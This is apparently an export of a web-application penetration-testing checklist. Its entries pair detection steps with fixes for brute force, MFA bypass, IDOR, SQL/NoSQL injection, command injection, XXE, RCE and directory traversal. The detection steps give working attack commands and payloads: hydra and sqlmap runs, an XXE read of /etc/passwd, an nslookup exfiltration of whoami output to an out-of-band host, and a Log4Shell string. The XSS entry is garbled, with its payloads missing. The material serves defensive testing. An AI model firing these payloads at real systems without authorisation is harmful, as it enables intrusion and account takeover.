categories.title: Web Application Security
categories.description: 600+ interactive test cases for authentication, injection, business logic, and OWASP WSTG-aligned web assessments.

items.title: Weak Passwords and Brute-Force Vulnerabilities
items.description: Test for weak passwords and brute-force vulnerabilities.
items.how_to_find: Manual: capture the login POST in Burp, send to Intruder, and fuzz the password parameter with a wordlist (Sniper for one field, Cluster Bomb for user+pass). Watch for identical response length/status on every attempt (no throttling). CLI with ffuf: ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u https://target.tld/login -fr 'Invalid credentials'. With hydra: hydra -l admin -P rockyou.txt target.tld https-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'. Confirm there is NO rate limit, NO lockout, NO CAPTCHA after repeated failures, and that short/common passwords (e.g. 'Password1') are accepted at registration. Also test username enumeration via distinct error messages ('user not found' vs 'wrong password') or response timing.
items.how_to_fix: Enforce NIST 800-63B: minimum 8-12 chars and block breached passwords using the HaveIBeenPwned range API (k-anonymity) or zxcvbn strength scoring at registration/change. Add progressive rate limiting plus temporary lockout (e.g. 5 failures / 15 min) keyed on BOTH account and source IP, and require CAPTCHA/step-up after repeated failures. Return a single generic error ('invalid username or password') and equalize response timing to kill enumeration. Enforce MFA on privileged accounts. Verify by re-running the Intruder/hydra attack and confirming throttling, lockout, and CAPTCHA all trigger.

items.title: Multi-Factor Authentication (MFA)
items.description: Verify that multi-factor authentication (MFA) is properly implemented.
items.how_to_find: After entering valid credentials, intercept the request that transitions from the password step to the OTP/2FA step. Test bypasses: (1) direct navigation - browse straight to /dashboard or an authenticated endpoint using the post-password session cookie without submitting the OTP; (2) response manipulation - change the OTP-verify response from {"success":false} to {"success":true} or HTTP 401->200 in Burp; (3) status/flag tampering - flip mfa_passed=false to true or drop the otp parameter; (4) OTP brute force - send the 6-digit code to Burp Intruder (numbers 000000-999999) and check for missing rate limit / no code expiry / code reuse; (5) backup/remember-device token predictability. Also test whether MFA can be disabled via the account API without re-authenticating.
items.how_to_fix: Bind the second factor to a server-side authentication state so no authenticated action is possible until MFA succeeds - never trust a client flag. Rate-limit OTP validation (e.g. 5 tries), expire codes in 30-60s, invalidate a code after one use, and generate them with a CSPRNG (TOTP RFC 6238 preferred). Require re-authentication + MFA to disable/change MFA and to change email/password. Log and alert on failed MFA. Verify by replaying each bypass above and confirming all are rejected.

items.title: Password Recovery, Reset, and Update
items.description: Check for password recovery, reset, and update vulnerabilities.
items.how_to_find: Trigger a reset and inspect the token in the emailed link. Check: (1) token entropy/predictability (sequential ints, timestamps, base64 of the email); (2) token expiry and single-use - reuse an old token, use it twice; (3) host header poisoning - send 'Host: attacker.tld' or 'X-Forwarded-Host: attacker.tld' and see if the reset link in the email points to attacker.tld (leaks the token). Test account takeover via parameter pollution: email=victim@site.com&email=attacker@site.com. Check the update flow requires the current password (curl -b cookies 'https://target/account/password' -d 'new=Pwn123!' with no old password). Test IDOR: change userId/email in the reset-confirm request to reset another user's password. Also check for OTP/reset-code brute force with no rate limit.
items.how_to_fix: Generate reset tokens with a CSPRNG (>=128-bit), store hashed, expire in 15-60 min, and invalidate on first use and after login/password change. Build reset URLs from a server-side configured base URL, never from the Host/X-Forwarded-Host header. Require the current password to change the password and re-authenticate for email changes. Rate-limit reset requests per account/IP and return generic responses ('if the account exists, an email was sent'). Verify by replaying host-header and token-reuse tests.

items.title: Session Management
items.description: Assess session management, ensuring secure cookies, session timeout, and session fixation.
items.how_to_find: Inspect the Set-Cookie header for the session cookie (DevTools > Application > Cookies, or curl -i https://target/login). Confirm HttpOnly, Secure, and SameSite=Lax/Strict flags are present. Test session fixation: capture the pre-login session ID, log in, and check whether the ID changes - if the same ID remains valid after auth, fixation is possible (attacker sets a known ID, victim logs in, attacker rides the session). Check token entropy (Burp Sequencer on the session cookie). Verify the session is invalidated server-side on logout by replaying an old request with the old cookie. Check concurrent-session handling and whether a token stays valid after password change.
items.how_to_fix: Set HttpOnly, Secure, and SameSite (Lax or Strict) on the session cookie, use a >=128-bit random ID from a CSPRNG, and scope it with a narrow Path/Domain. Regenerate the session ID on login and on privilege change (defeats fixation). Invalidate sessions server-side on logout, password change, and after idle/absolute timeout. Verify with Burp Sequencer (high entropy) and by replaying old cookies (should be rejected).

items.title: Logout Functionality
items.description: Ensure proper logout functionality and invalidation of sessions.
items.how_to_find: Log in, capture an authenticated request (e.g. GET /api/profile with the session cookie/JWT), then log out. Replay the captured request in Burp Repeater with the same cookie/token - if it still returns 200 with user data, logout only cleared the client and the session is not invalidated server-side. For JWTs, confirm whether the token is added to a server-side denylist on logout (stateless JWTs often remain valid until expiry). Check the logout endpoint is not CSRF-able in a way that logs users out, and that back-button/cached authenticated pages are not served after logout (Cache-Control).
items.how_to_fix: On logout, destroy the session server-side (delete from the session store), clear the cookie, and for JWTs add the token jti to a denylist until its exp or use short-lived access tokens with revocable refresh tokens. Set Cache-Control: no-store on authenticated pages. Verify by replaying a captured authenticated request after logout and confirming 401/redirect.

items.title: Default Credentials
items.description: Check if default credentials are changed or disabled.
items.how_to_find: Fingerprint the app/framework/appliance (Wappalyzer, whatweb https://target) then try vendor default creds: admin/admin, admin/password, root/root, admin/changeme, tomcat/tomcat, etc. Reference the SecLists Default-Credentials list (/usr/share/seclists/Passwords/Default-Credentials/) and vendor docs. Test admin consoles and hidden paths: /admin, /manager/html (Tomcat), /phpmyadmin, /solr, /actuator, /jenkins, /grafana (admin/admin). Spray with netexec/hydra against the login using the default-creds list. Check devices/CMS/DB admin panels specifically.
items.how_to_fix: Force a password change on first login for every default/admin account, or ship with unique per-instance random credentials. Disable or rename unused default accounts, restrict admin consoles to trusted networks/VPN, and add MFA. Verify by attempting the documented default credentials post-hardening (should fail).

items.title: Account Lockout Mechanism
items.description: Verify the presence and effectiveness of account lockout mechanisms after multiple failed login attempts.
items.how_to_find: Submit repeated failed logins for one account (Burp Intruder, 20+ tries) and observe whether a lockout/CAPTCHA/delay ever triggers. Then test lockout bypasses: (1) rotate source IP via X-Forwarded-For / X-Real-IP headers to reset an IP-based counter; (2) change case of the username (Admin vs admin) or add trailing dot/space to dodge account-based counters; (3) if lockout exists, test denial-of-service (an attacker can lock out legitimate users by spamming failures). Balance against password spraying: one password across many users (netexec smb/http -u users.txt -p 'Winter2025!') often evades per-account lockout entirely.
items.how_to_fix: Prefer throttling + progressive delays + CAPTCHA over hard lockouts to avoid DoS; if using lockout, apply a short auto-unlock window (15-30 min). Count failures normalized on the canonical account identity (not raw string) and rate-limit per source using trusted IP determination, not spoofable headers. Detect password spraying (many accounts, few attempts each) with anomaly alerting. Verify by replaying header-spoofing and spraying attempts.

items.title: Secure Password Storage
items.description: Ensure passwords are stored securely using strong hashing algorithms like bcrypt.
items.how_to_find: This is largely a code/DB review. If you have DB/dump access, inspect the password column: bcrypt hashes start with $2a$/$2b$/$2y$, argon2 with $argon2id$, scrypt/PBKDF2 have identifiable prefixes; a raw 32-hex string is likely unsalted MD5 and a 40-hex is SHA1 (both broken for passwords). Identify with hashid or hash-identifier and confirm crackability with hashcat (e.g. hashcat -m 0 hashes.txt rockyou.txt for MD5). Black-box signals: password max-length caps of 8-16 chars, passwords echoed back, or reset emails containing the plaintext password indicate weak/reversible storage. Check for pepper/salt usage in code review.
items.how_to_fix: Hash passwords with a memory-hard, salted, adaptive KDF: Argon2id (preferred), scrypt, or bcrypt (cost >=12); never MD5/SHA1/SHA256-alone or reversible encryption. Use a unique per-user salt (built into bcrypt/argon2) and optionally an app-level pepper stored in a secret manager. Never email/store plaintext passwords and don't cap length below ~64 chars. Migrate legacy hashes by re-hashing on next successful login. Verify via code review and by cracking a sample hash (should be infeasible).

items.title: Token Expiration
items.description: Verify that authentication tokens have appropriate expiration times.
items.how_to_find: For JWTs, decode the token (jwt.io, or echo TOKEN | cut -d. -f2 | base64 -d) and read the exp/iat/nbf claims - flag missing exp or very long lifetimes (days/weeks). Test replay: capture a token, wait past its supposed expiry, and replay it in Burp Repeater; if still accepted, expiry is not enforced server-side. For opaque session tokens, replay an old token hours later. Check that refresh tokens rotate and old refresh tokens are revoked after use. Confirm tokens are invalidated on logout/password change (not just expiry).
items.how_to_fix: Use short-lived access tokens (5-15 min) with rotating, revocable refresh tokens. Always set and server-side-enforce exp (and validate nbf/iat); reject expired tokens. Bind refresh-token rotation with reuse detection (revoke the family on replay). Invalidate tokens on logout and credential change. Verify by replaying an expired/old token and confirming rejection.

items.title: Session Hijacking
items.description: Test for vulnerabilities that could lead to session hijacking, such as missing Secure or HttpOnly flags on cookies.
items.how_to_find: Check Set-Cookie flags (curl -i https://target/login | grep -i set-cookie): a session cookie without HttpOnly is stealable via XSS (document.cookie), without Secure it can leak over HTTP/MITM, without SameSite it is exposed to CSRF. Test whether a copied session cookie works from a different IP/User-Agent (no binding). Look for the session token in URLs, logs, or the Referer header (leaks to third parties). Combine with any reflected/stored XSS to demonstrate cookie theft. Check for missing HSTS enabling cookie theft via SSL strip.
items.how_to_fix: Set HttpOnly, Secure, and SameSite=Lax/Strict on session cookies; serve the whole app over HTTPS with HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains; preload). Never place session IDs in URLs. Regenerate the session on privilege change and invalidate server-side on logout. Optionally bind sessions to coarse client attributes and alert on anomalies. Verify flags with curl and confirm HTTP requests are redirected to HTTPS.

items.title: Secure Login Forms
items.description: Ensure that login forms are served over HTTPS and do not expose credentials in logs or URL parameters.
items.how_to_find: Confirm the login page AND its form action are HTTPS (view-source and check <form action> is https, not http). Verify credentials are sent in the POST body, not the query string (curl/Burp - a GET /login?user=x&pass=y would leak into server logs, browser history, and Referer). Test http:// access to the login page - it should 301 to https and set HSTS. Check autocomplete handling for sensitive fields, and that the password field is type=password. Verify TLS config (testssl.sh https://target) for weak protocols/ciphers.
items.how_to_fix: Serve the entire site over HTTPS with HSTS and redirect all HTTP to HTTPS; submit credentials via POST body only. Keep credentials out of URLs, logs, and analytics. Use a modern TLS config (TLS 1.2/1.3, strong ciphers) - validate with testssl.sh or SSL Labs. Verify with curl -i http://target/login (should redirect) and confirm no credentials appear in access logs.

items.title: CAPTCHAs
items.description: Verify the implementation of CAPTCHAs to prevent automated login attempts.
items.how_to_find: Test whether the CAPTCHA is actually enforced server-side: submit the login/form request in Burp Repeater without the g-recaptcha-response / captcha parameter, or with an empty/garbage value - if it still succeeds, the check is client-side only. Test token reuse (replay the same captcha token multiple times - it should be single-use) and whether removing the CAPTCHA only after N failures leaves the first N attempts unprotected. Check if the CAPTCHA appears only on the front end but the API endpoint (/api/login) accepts requests directly. See the SecurityCipher CAPTCHA-bypass notes for provider-specific tricks.
items.how_to_fix: Validate the CAPTCHA token server-side on every protected request by calling the provider's verify API, enforce single-use tokens, and check the returned hostname/score (reCAPTCHA v3). Apply CAPTCHA to the actual backend endpoint, not just the UI, and combine with rate limiting. Verify by replaying requests with missing/reused tokens (should be rejected).

items.title: Password Complexity
items.description: Ensure password policies enforce complexity requirements (length, character variety).
items.how_to_find: At registration and password-change, try weak values: '123456', 'password', a 1-char password, the username as password, and a very long password (test truncation/DoS at 1000+ chars). Confirm the policy is enforced server-side, not just by JS: submit a weak password directly via Burp Repeater bypassing front-end validation. Check whether common/breached passwords are blocked and whether the change flow re-validates strength. Note both extremes - too weak, or overly restrictive rules that push users to predictable patterns.
items.how_to_fix: Follow NIST 800-63B: enforce length (min 8-12, allow up to 64+), screen against breached-password/dictionary lists (HaveIBeenPwned, zxcvbn), and avoid mandatory arbitrary composition rules that harm usability. Enforce all checks server-side and support passphrases/password managers (allow paste, all Unicode). Verify by submitting weak/breached passwords via Burp (should be rejected).

items.title: Remember Me
items.description: Check the security of "Remember Me" functionality and ensure tokens expire appropriately.
items.how_to_find: Enable 'remember me', then inspect the persistent cookie. Decode it (base64/hex) and check for predictable or sensitive content - e.g. base64(username:password), a raw user ID, or a static token (any of these = account takeover if leaked). Test token reuse after logout (should be revoked) and after password change (should be invalidated). Check the cookie flags (HttpOnly, Secure, SameSite) and lifetime (flag multi-month/never-expiring tokens). Try tampering the identifier portion to impersonate another user.
items.how_to_fix: Implement remember-me as a random, single-use series+token pair (per OWASP) stored hashed server-side, rotated on each use with theft detection, and expiring in a bounded window (e.g. 30 days). Never embed credentials or guessable IDs in the cookie. Set HttpOnly/Secure/SameSite, and revoke tokens on logout and password change. Verify by decoding the cookie and replaying it after logout/password change (should fail).

items.title: Session Timeout
items.description: Validate session timeout configurations to prevent extended idle sessions.
items.how_to_find: Log in, capture an authenticated request, leave the session idle, then replay the request after increasing intervals (15 min, 1 hr, 12 hr, days) in Burp Repeater to find the real idle-timeout and absolute-timeout. If the token remains valid indefinitely, there is no server-side expiry. Check both idle timeout (inactivity) and absolute timeout (max session age regardless of activity). Confirm client-side 'you have been logged out' popups actually correspond to server-side invalidation (replay the old token after the popup).
items.how_to_fix: Enforce both an idle timeout (e.g. 15-30 min for sensitive apps) and an absolute timeout (e.g. 8-12 hr) server-side; regenerate/expire tokens accordingly. Make the front-end warning reflect real server-side termination. Verify by replaying a token after the timeout window (should return 401/redirect).

items.title: Inactive Account Handling
items.description: Ensure that inactive accounts are disabled after a defined period.
items.how_to_find: Mostly a process/config review: confirm there is a documented policy and an automated job that disables accounts after N days of inactivity (e.g. 90) and de-provisions departed staff. Signals during testing: old/stale accounts (former employees, test accounts like test/demo/qa) that still authenticate, orphaned service accounts, and dormant admin accounts. Cross-reference an HR/leaver list with active accounts if available, and check last-login timestamps in admin panels.
items.how_to_fix: Automate detection and disabling of inactive accounts after a defined threshold, integrate a joiner-mover-leaver process with HR/IdP for immediate de-provisioning, and periodically review service/admin accounts. Alert on logins to long-dormant accounts. Verify by confirming the disable job runs and that a seeded stale account is disabled after the threshold.

items.title: Privilege Escalation
items.description: Test for vertical and horizontal privilege escalation.
items.how_to_find: Vertical: log in as a low-priv user, then replay admin-only requests captured from an admin (or guessed: GET /admin, POST /api/users/{id}/role) using the low-priv session cookie - if it succeeds, access control is missing. Burp extension 'Autorize' automates this: set the low-priv cookie as the 'to-replace' header and browse as admin; green=enforced, red=bypass. Horizontal: change an identifier (id, uuid, account_no) to another user's value and see if you get their data. Also test role tampering: flip role=user to role=admin in the request body, JSON, JWT claims, or a hidden field, and remove authorization headers to test unauthenticated access.
items.how_to_fix: Enforce authorization server-side on every request at the object and function level (deny by default). Derive the acting user's role/identity from the server session, never from client-supplied fields or JWT claims that aren't verified. Use centralized, tested access-control middleware and map each endpoint to required roles/permissions. Log authorization failures and alert on spikes. Verify by re-running Autorize and confirming all privileged actions are denied for low-priv/anonymous users.

items.title: Role-Based Access Control (RBAC)
items.description: Verify role-based access control (RBAC) implementation.
items.how_to_find: Map every role (anonymous, user, manager, admin) to the endpoints and UI actions each can reach, then cross-test with the Burp Autorize/AuthMatrix extensions: capture requests as a high-priv role and replay them with lower-priv sessions. Look for endpoints that only hide the button in the UI but still accept the request (function-level access control missing). Test that changing a role parameter, group ID, or permission array in the request escalates access, and that assigning yourself to a privileged group via a self-service API is blocked.
items.how_to_fix: Implement RBAC checks server-side at every endpoint using a single authorization layer; deny by default and require explicit grants. Never rely on UI hiding for security. Keep role-to-permission mappings in code/config that is unit-tested, and re-validate on each request from the trusted session. Verify by running AuthMatrix across the full role x endpoint matrix and confirming no unauthorized cell succeeds.

items.title: Insecure Direct Object References (IDOR)
items.description: Check for Insecure Direct Object References (IDOR).
items.how_to_find: Find requests that reference objects by an identifier (GET /api/orders/1001, /invoice?id=55, /files/download?doc=abc). Create two accounts (A and B); using A's session, swap the identifier to B's object and see if you read/modify it. Enumerate with Burp Intruder over numeric IDs or use ffuf: ffuf -w ids.txt -H 'Cookie: session=A' -u 'https://target/api/orders/FUZZ' -mc 200. Also test GUIDs (sometimes leaked elsewhere), encoded/hashed IDs, IDs in JSON bodies and headers, and method changes (GET vs POST/PUT/DELETE). The Burp Autorize extension flags IDOR automatically across a browse session.
items.how_to_fix: Enforce an ownership/authorization check on every object access server-side: verify the object belongs to (or is shared with) the authenticated user before returning or modifying it. Prefer indirect references (per-session mapping) or unguessable UUIDs, but never rely on unguessability alone. Return 404/403 uniformly to avoid leaking existence. Verify by replaying cross-account requests (should return 403/404) and re-running Autorize.

items.title: Access Control Policies
items.description: Review and test access control policies for effectiveness.
items.how_to_find: Review documented access-control policy vs actual enforcement. Test each policy rule: e.g. 'only owners can delete' - try deleting as a non-owner; 'read-only role cannot write' - try a write. Look for policies enforced only at the gateway/proxy but bypassable by hitting the backend service directly, or policies applied on one HTTP method but not others (GET protected, but PATCH open). Check for allow-list vs deny-list mistakes and default-allow behavior on unmatched routes.
items.how_to_fix: Centralize access-control decisions (policy engine / middleware) with deny-by-default, apply them uniformly across all methods and entry points (no direct backend bypass), and cover them with automated tests. Document the policy and keep code in sync. Verify by exercising each policy rule from an unauthorized context and confirming denial.

items.title: Least Privilege Principle
items.description: Ensure that users have the minimum level of access necessary to perform their functions.
items.how_to_find: Enumerate what a standard account can actually do vs what its job requires. Check for over-scoped API tokens/OAuth scopes (decode the JWT scope claim), users in admin groups unnecessarily, service accounts with broad rights, and features accessible that shouldn't be. Review any 'roles'/'permissions' returned by the profile/me endpoint (GET /api/me) for excessive grants. Test whether a normal token can call administrative/internal APIs.
items.how_to_fix: Grant the minimum permissions/scopes needed per role and per token; split broad roles into narrow ones. Scope API tokens tightly and short-lived, review group membership regularly, and remove unused privileges. Verify by confirming a standard token is rejected from administrative/internal endpoints.

items.title: Forceful Browsing
items.description: Test if unauthorized users can access restricted resources by manipulating URLs or parameters.
items.how_to_find: Directly request restricted URLs/resources that aren't linked for your role: /admin, /admin/config, /reports/2024/salary.pdf, /api/internal/*, backup files, and predictable paths. Brute force with feroxbuster or ffuf using an authenticated cookie: ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H 'Cookie: session=lowpriv' -u 'https://target/FUZZ' -mc 200,301,302,403. Test sequential/predictable file names and parameter-based access (?page=admin, ?debug=true). A 200 on a resource your role shouldn't see = forceful browsing / missing access control.
items.how_to_fix: Require authorization on every resource server-side, not just removal of links; return 403/404 for unauthorized paths regardless of how they are reached. Don't store sensitive files in web-accessible directories with guessable names. Verify by re-running the forced-browse wordlist as a low-priv/anonymous user and confirming no restricted resource returns 200.

items.title: Multi-Tenancy
items.description: Verify that users from different tenants cannot access each other's data.
items.how_to_find: Create accounts in two separate tenants/orgs (Tenant A and Tenant B). Using A's session, swap the tenant/org identifier in requests (org_id, tenant, company header, subdomain, X-Tenant-ID) to B's value and try to read/modify B's data. Test IDOR on tenant-scoped objects, and check whether the tenant is derived from a client-controllable field vs the session. Also test shared caches, exported reports, and search endpoints for cross-tenant leakage.
items.how_to_fix: Derive the tenant context from the authenticated session/token server-side and scope every query with the tenant ID (row-level filtering) - never trust a client-supplied tenant identifier. Add automated cross-tenant tests. Verify by attempting cross-tenant access from Tenant A to Tenant B objects (should all fail with 403/404).

items.title: Security Misconfigurations
items.description: Check for misconfigurations in access controls, such as overly permissive roles.
items.how_to_find: Look for overly permissive access-control config: wildcard role grants, default 'authenticated=all-access', admin endpoints without an authorization annotation, framework routes exposed by default (Spring Actuator /actuator, Django admin, GraphQL introspection), and CORS allowing arbitrary origins with credentials (Access-Control-Allow-Origin reflected + Allow-Credentials: true). Test with curl -H 'Origin: https://evil.tld' -I https://target/api and inspect the ACAO reflection. Check for verbose errors and debug endpoints revealing authorization internals.
items.how_to_fix: Apply least-privilege role definitions, disable/secure framework default endpoints, and restrict CORS to explicit trusted origins (never reflect arbitrary Origin with Allow-Credentials). Harden per CIS/vendor benchmarks and remove debug/verbose errors in production. Verify by re-testing CORS and framework endpoints post-hardening.

items.title: Time-Based Authorization
items.description: Test for authorization that changes based on time or other factors.
items.how_to_find: Where access depends on time (trial expiry, business-hours access, temporary grants, scheduled roles), test whether the check is server-side and tamper-resistant. Try acting after a trial/grant should have expired (replay a token issued during the valid window), manipulate client-sent timestamps/timezones, and check for race conditions around expiry. Confirm expired temporary elevations are actually revoked, not just hidden in the UI.
items.how_to_fix: Evaluate time-based rules on the server using an authoritative clock; expire and revoke grants/tokens server-side at the boundary and reject client-supplied time values. Verify by attempting access just after expiry and by replaying tokens issued during a valid window (should be denied).

items.title: Logical Access Controls
items.description: Ensure that access control mechanisms are implemented logically throughout the application.
items.how_to_find: Test whether access controls are enforced consistently across the whole workflow, not just the entry step. Common gaps: authorization checked when opening a wizard but not on the final submit; a shared 'update' endpoint reused by multiple features where only some enforce checks; state transitions (draft->approved) callable out of order to skip an approval gate. Walk each multi-step flow and replay intermediate/final steps directly with a lower-priv session.
items.how_to_fix: Re-check authorization at every step and on the sensitive action itself (server-side), not only at flow entry; validate state transitions against allowed sequences. Consolidate shared endpoints behind consistent checks. Verify by invoking each step/transition directly as an unauthorized user (should be denied).

items.title: Role Misuse
items.description: Check for roles being misused to gain unauthorized access.
items.how_to_find: Test whether a legitimate role can be abused beyond its intent: a 'support' role reading all users' PII, a 'read-only' analyst exporting bulk data, or a role that can grant itself/others higher roles (POST /api/users/{id}/roles). Check for missing separation of duties (the same user can both create and approve). Try assigning a privileged role to your own account via any user-management API reachable by your role.
items.how_to_fix: Constrain each role to its intended actions and data scope, enforce separation of duties for sensitive operations (maker/checker), and forbid self-elevation or self-approval. Log and alert on role/permission changes. Verify by attempting self-elevation and duty-violating actions (should be denied).

items.title: Sensitive Functionality
items.description: Ensure sensitive functionality is only accessible by authorized roles.
items.how_to_find: Enumerate sensitive actions (user impersonation, data export, payment/refund, config change, delete-all) and confirm each requires the correct role AND, ideally, re-authentication/step-up. As a low-priv user, call these endpoints directly (from JS references, Swagger/OpenAPI, or mobile app traffic). Check for admin/impersonation features (POST /admin/impersonate?user=) callable without admin rights, and dangerous actions guarded only by the UI.
items.how_to_fix: Gate sensitive functionality with strict server-side authorization plus step-up authentication (re-enter password/MFA) for the most dangerous actions, and log every use. Never expose these operations to lower roles or via undocumented endpoints. Verify by invoking each sensitive action as an unauthorized user (should be denied) and confirming step-up is enforced.

items.title: Dynamic Access Control
items.description: Test for dynamic access control based on context (e.g., IP address, device).
items.how_to_find: Where access depends on context (IP allow-list, geo, device fingerprint, managed-device posture), test whether the signals are spoofable. Try IP-based restrictions via X-Forwarded-For/X-Real-IP/X-Client-IP header injection, spoof geo via VPN/headers, and clone device identifiers/cookies. Confirm 'trusted network only' admin panels aren't reachable from the internet by faking an internal IP header. Test that stepping outside the allowed context actually blocks access rather than just warning.
items.how_to_fix: Base contextual decisions on server-trusted signals (real socket IP, verified device attestation), not spoofable request headers; treat client-provided context as untrusted input. Combine context with primary authz (defense in depth) so spoofing context alone never grants access. Verify by attempting header/geo/device spoofing (should not bypass controls).

items.title: Cross-Site Scripting (XSS)
items.description: Test for XSS vulnerabilities (Reflected, Stored, DOM-based).
items.how_to_find: Reflected: inject a marker into every param (search, error, UTM, headers) and grep the response for it un-encoded, then try context-specific payloads: HTML body or ; inside an attribute ">. Automate discovery: dalfox url 'https://target/?q=FUZZ', or XSStrike -u 'https://target/?q=test'. Confirm whether CSP/output-encoding actually blocks execution.
items.how_to_fix: Context-aware output encoding (HTML entity, attribute, JS, URL, CSS) at the point of output - rely on framework auto-escaping (React/Angular/Django templates) and avoid dangerouslySetInnerHTML/v-html/innerHTML with untrusted data. Sanitize rich HTML server-side with an allow-list library (DOMPurify for client rendering). Deploy a strict CSP (default-src 'self'; object-src 'none'; base-uri 'none'; no unsafe-inline via nonces/hashes) as defense-in-depth, and set HttpOnly on session cookies. Re-test with the same payloads after the fix.

items.title: SQL Injection (SQLi) and NoSQL Injection
items.description: Check for SQL Injection (SQLi) and NoSQL Injection.
items.how_to_find: SQLi manual: append ' and " to params and watch for DB errors; test boolean (' OR '1'='1 vs ' AND '1'='2), UNION (' UNION SELECT NULL,NULL-- with correct column count), and time-based blind (' OR SLEEP(5)-- for MySQL, '; WAITFOR DELAY '0:0:5'-- for MSSQL, ' || pg_sleep(5)-- for Postgres). Automate: sqlmap -u 'https://target/item?id=1' --batch --risk=2 --level=3 --dbs, or save a Burp request and run sqlmap -r req.txt --dbs. NoSQL (MongoDB): send {"user":{"$ne":null},"pass":{"$ne":null}} or user[$ne]=1 in form/JSON to bypass auth; test operator injection with NoSQLMap. Watch for errors, differing responses, and OOB DNS callbacks.
items.how_to_fix: Use parameterized queries / prepared statements or an ORM with bound parameters everywhere; never concatenate user input into queries. Validate/allow-list identifiers that can't be parameterized (table/column names, ORDER BY). For NoSQL, cast inputs to the expected type and reject query operators ($ne, $gt, $where) from user input. Apply least-privilege DB accounts and disable verbose SQL errors. Verify by re-running sqlmap/NoSQLMap (should report not injectable) and add a regression test for the parameter.

items.title: Command Injection, LDAP Injection, and XML External Entities (XXE)
items.description: Assess for Command Injection, LDAP Injection, and XML External Entities (XXE).
items.how_to_find: Command injection: on params that reach shell/OS calls (ping, convert, export), inject separators - ; id, | id, `id`, $(id), && id, and blind/OOB variants ; nslookup $(whoami).OOB.burpcollaborator.net or time-based ; sleep 5. LDAP injection: in login/search filters send * , )(uid=* , *)(|(uid=*)) to bypass or enumerate. XXE: in any XML endpoint (SOAP, SAML, DOCX, SVG upload) send <?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r> for file read, or an external DTD to your server for blind/OOB exfiltration. Confirm via response reflection, timing, or Burp Collaborator DNS/HTTP hits.
items.how_to_fix: Command: avoid shelling out; use language APIs/libraries, and if unavoidable pass args as an array (no shell) with strict allow-list validation - never build a command string from input. LDAP: escape special chars per RFC 4515 or use parameterized LDAP APIs. XXE: disable DTD processing and external entities in the XML parser (e.g. setFeature('http://apache.org/xml/features/disallow-doctype-decl', true) / FEATURE_SECURE_PROCESSING), prefer JSON, and use hardened parser configs. Verify by replaying each payload (should be inert) and add regression tests.

items.title: Client-Side and Server-Side Validation
items.description: Validate input on both client-side and server-side.
items.how_to_find: Confirm validation isn't client-side only: bypass JS validation by submitting the request directly in Burp Repeater/curl with invalid values (negative numbers, over-max-length strings, wrong types, extra fields, disallowed enum values, malformed email). If the server accepts what the front-end rejected, server-side validation is missing. Also disable JS in the browser and resubmit forms. Test hidden/disabled fields and mismatched Content-Type (send JSON to a form endpoint).
items.how_to_fix: Treat all client-side validation as UX only; enforce strict server-side validation on type, length, range, format, and allow-listed values for every input, and reject unexpected fields. Use a schema/validation library (JSON Schema, pydantic, Joi, Bean Validation). Verify by resubmitting the invalid values via Burp (server should reject with 400).

items.title: Cross-Site Script Inclusion (XSSI)
items.description: Test for the possibility of including external scripts that execute within the application's context.
items.how_to_find: Find dynamic JavaScript/JSONP endpoints that return sensitive data as executable JS (e.g. /api/user.js returning var user={...} or a JSONP callback=?). Include the script cross-origin from an attacker page (<script src='https://target/api/user.js'></script>) and read the global variables/array it defines, or supply a malicious callback name to a JSONP endpoint to exfiltrate data. Look for responses served as text/javascript containing PII/tokens without anti-CSRF or origin checks, and callback params reflected into JS.
items.how_to_fix:
Don't return sensitive data as executable JavaScript or via JSONP; use JSON with a non-executable content type (application/json) and require authentication + CSRF/origin checks. Prefix JSON responses with an anti-hijack guard (e.g. )]}',
) and validate/allow-list any JSONP callback name. Set X-Content-Type-Options: nosniff. Verify by attempting cross-origin <script> inclusion (should not expose data).

items.title: HTTP Parameter Pollution
items.description: Check if multiple parameters with the same name can be used to manipulate the application logic.
items.how_to_find: Send duplicate parameters and observe which value wins and whether it differs between the front-end proxy and back-end (parser discrepancy). Example: /transfer?amount=10&amount=10000 or role=user&role=admin; in POST body: user=victim&user=attacker. Different stacks pick first (PHP/Apache last, Tomcat first, ASP concatenates). Use it to bypass WAF/validation (split a payload across duplicates), tamper business logic, or override server-set params. Test in query string, POST body, and JSON arrays.
items.how_to_fix: Normalize handling of duplicate parameters server-side (reject duplicates or explicitly define precedence), validate the final resolved value, and ensure the WAF and app parse parameters identically. Don't rely on client-supplied copies of server-controlled values. Verify by replaying duplicated-parameter requests (should be handled consistently/rejected).

items.title: Remote Code Execution (RCE)
items.description: Test for vulnerabilities that could lead to remote code execution.
items.how_to_find: RCE usually chains from another flaw: unsafe deserialization (Java ysoserial gadget chains, Python pickle, PHP unserialize/phar, .NET), template injection (SSTI), command injection, insecure file upload of a web shell, or a known CVE in a component (e.g. Log4Shell ${jndi:ldap://oob/a}, Spring4Shell, deserialization CVEs). Test OOB with Burp Collaborator: inject a payload that triggers DNS/HTTP to your host to confirm blind execution. Identify the stack (whatweb, version banners), map exposed libraries (retire.js, dependency versions), and target the matching gadget/CVE. Confirm with a benign command (id/whoami) or an OOB callback - never run destructive commands.
items.how_to_fix: Patch/upgrade vulnerable components (track with SCA/dependency scanning). Never deserialize untrusted data - use safe formats (JSON) and allow-list types if deserialization is required. Eliminate the underlying injection (command/SSTI/upload) per its specific fix. Run the app as a low-privilege user, sandbox/segment it, and add egress filtering to block OOB callbacks. Verify by re-testing the exact chain (should be inert).

items.title: Directory Traversal
items.description: Check for directory traversal vulnerabilities that could allow access to unauthorized files.
items.how_to_find: On params that reference files (?file=, ?template=, ?download=, ?lang=), inject traversal sequences: ../../../../etc/passwd (Linux), ..\..\..\windows\win.ini (Windows). Try encodings to bypass filters: %2e%2e%2f, double-encode %252e%252e%252f, dot-truncation ....//, and null byte ..%00. Use Burp Intruder or ffuf with the SecLists LFI wordlist (/usr/share/seclists/Fuzzing/LFI/). A successful read (root:x:0:0 in the response) confirms it. Also test path params in APIs and archive extraction (Zip Slip).
items.how_to_fix: Never build filesystem paths from user input; map requests to an allow-list of known files/IDs. If a filename is required, canonicalize the resolved path and confirm it stays within an intended base directory (realpath prefix check), strip path separators, and reject traversal sequences after decoding. Run with least-privilege file permissions. Verify by replaying traversal/encoding payloads (should return 400/404).

